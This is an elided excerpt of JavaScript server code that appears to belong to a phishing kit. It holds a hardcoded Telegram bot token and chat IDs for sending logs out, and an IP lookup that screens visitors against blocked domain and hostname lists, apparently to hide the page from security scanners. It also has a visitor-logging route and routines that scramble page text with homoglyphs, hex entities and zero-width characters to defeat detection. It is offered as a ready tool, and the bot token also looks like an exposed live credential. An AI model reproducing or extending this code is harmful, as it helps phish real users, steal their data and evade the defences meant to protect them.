...
const BOT_TOKEN = "7853777072:AAF6h-JEiVFRJxP7YkcHF1joNT1fF5HAXrU"; // Replace with your Telegram bot token
const CHAT_LOG = "-4861751005"; // Replace with your group chat ID
const CHAT_ID = "-4861751005"; // Replace with your group chat ID
const LANG_ALL = "IT"; // Replace with your group chat ID
...
async function checkIpAddress(ip, attempt = 1) {
  ...
  try {
    ...
    const result = {
      ...
      hasBlockedDomain: blockedDomainKeywords.some((keyword) =>
        domain.includes(keyword),
      ),
      hasBlockedHostname: hostnames.some((h) =>
        blockedHostnames.some((b) => h.includes(b)),
      ),
...
app.get("/visitor", (req, res) => {
  ...
  visitorList.forEach((entry) => {
    if (entry.ip !== currentIp) {
      // Skip adding the current visitor's IP to the list
      visitorItems += `
...
function encodeAndBreakWord(word) {
  ...
  for (let i = 0; i < word.length; i++) {
    ...
    const encodedChar =
      i === 0 ? glyph : `&#x${glyph.charCodeAt(0).toString(16)};`;
    const zwc =
      ZERO_WIDTH_CHARS[Math.floor(Math.random() * ZERO_WIDTH_CHARS.length)];
...
function obfuscateHtml(html) {
  return html.replace(
    ...
    (match, tag, attrs, content) => {
      ...
      const obfuscatedContent = content.replace(
        /([^<>]+)(?=<|$)/g,
        (textNode) => {
